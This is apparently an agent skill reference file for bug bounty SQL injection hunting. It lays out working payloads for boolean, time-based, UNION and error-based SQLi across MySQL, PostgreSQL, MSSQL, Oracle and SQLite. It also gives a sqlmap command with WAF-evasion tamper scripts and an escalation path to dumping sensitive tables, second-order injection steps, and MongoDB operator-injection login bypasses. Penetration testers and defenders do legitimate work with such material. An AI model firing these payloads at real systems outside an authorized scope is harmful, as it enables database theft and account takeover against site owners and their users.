# SQLi Hunter — Deep Workflows

Companion to SKILL.md. Detection diffing, manual exploitation, sqlmap
tuning, and NoSQL injection.

## Step 1: Detection — response differential testing

```bash
# Boolean-based baseline: send truthy and falsy variants, DIFF the responses
#   vulnerable pattern: ?id=1          -> normal page
#                       ?id=1'         -> error or empty
#                       ?id=1 AND 1=1  -> identical to baseline
#                       ?id=1 AND 1=2  -> differs from baseline
# Time-based confirmation when responses are stable:
?id=1 AND SLEEP(5)-- -
?id=1'; WAITFOR DELAY '0:0:5'-- -        (MSSQL)
?id=1 || pg_sleep(5)-- -                 (PostgreSQL)
# Numeric vs string context:
?id=(SELECT 1)                            numeric context probe
?id=' OR '1'='1                           string context probe
```

Record exact byte-diffs (Burp Comparer). A WAF block page is NOT a
vulnerability signal — check body for vendor signatures.

## Step 2: Confirm DBMS fingerprint

```text
MySQL:      ' AND @@version-- / SLEEP() / information_schema exists
PostgreSQL: ' AND version()--  / ::int casts / pg_sleep()
MSSQL:      WAITFOR DELAY / @@version / CONVERT(int,@@version)
Oracle:     '||' concatenation works / dbms_pipe.receive_batch_messages
SQLite:     sqlite_version() / no information_schema / typeof(1)
```

## Step 3: Manual UNION exploitation flow

```sql
' ORDER BY 1-- -        increment until column count found (N)
' UNION SELECT NULL,NULL,...,NULL-- -   match N nulls
' UNION SELECT 'a',NULL,NULL-- -        find text-capable columns
' UNION SELECT table_name,NULL,NULL FROM information_schema.tables WHERE table_schema=database()-- -
' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='<t>'-- -
' UNION SELECT <col1>,<col2>,NULL FROM <t> LIMIT 20 OFFSET 40-- -
```

Error-based shortcut (MySQL):
```sql
' AND extractvalue(1,concat(0x7e,(SELECT version())))-- -
' AND updatexml(1,concat(0x7e,(SELECT user())),1)-- -
```

## Step 4: Blind extraction automation

```bash
# Time-based with binary search per character (keep concurrency = 1,
# delay >= 4s so network jitter cannot false-positive):
for pos in $(seq 1 30); do
  for bit logic in ...; do :; done
done
# Prefer sqlmap for the loop instead:

# sqlmap tuned for this workspace's WAF guidance:
sqlmap -u "https://target.example.com/item?id=1" \
  --random-agent --batch --level=3 --risk=2 \
  --technique=BT --delay=1 --timeout=30 \
  --threads=1 \
  --tamper=space2comment,between \
  --output-dir=programs/<slug>/temp/sqlmap
# Escalate flags ONLY after detection is confirmed (--dbs, then targeted
# -D db -T table -C col --dump on sensitive tables).
```

## Step 5: Second-order SQLi

```bash
# 1. STORE payload where it is safely stored but later used in another query:
PUT /api/profile {"nickname": "x' AND extractvalue(1,version())-- -"}
# 2. TRIGGER the second query (report generation, admin listing, export):
GET /admin/users/export.csv
# 3. Error/behavior surfaces there, not at storage time. Always re-login
#    and view every feature that renders your stored values.
```

## Step 6: NoSQL injection

```bash
# MongoDB operator injection in JSON bodies:
curl -X POST https://target/api/login -H "Content-Type: application/json" \
  -d '{"user":{"$ne":null},"pass":{"$ne":null}}'
-d '{"user":"admin","pass":{"$regex":"^a"}}'     # char-by-char extraction
-d '{"$where":"sleep(5000) || true"}'            # $where JS execution
# Array-style params (PHP convention):
POST /login  user[$ne]=x&pass[$ne]=y
# Auth bypass success signal: 200/302 with Set-Cookie instead of 401.
```

## False-positive elimination

1. `AND 1=1` vs `AND 1=2` must produce CONSISTENT diffs across 3 runs.
2. Time-based: run falsy control (`AND SLEEP(0)`) alongside each test.
3. WAF block != injectable; confirm via behavior change not status alone.
4. For sqlmap findings, manually replay ONE extracted value to verify.

## Reporting pointers

Severity: High (auth bypass/data read) to Critical (RCE via xp_cmdshell/
COPY TO PROGRAM — only claim what program scope permits proving).
Use assets/report-template.md.
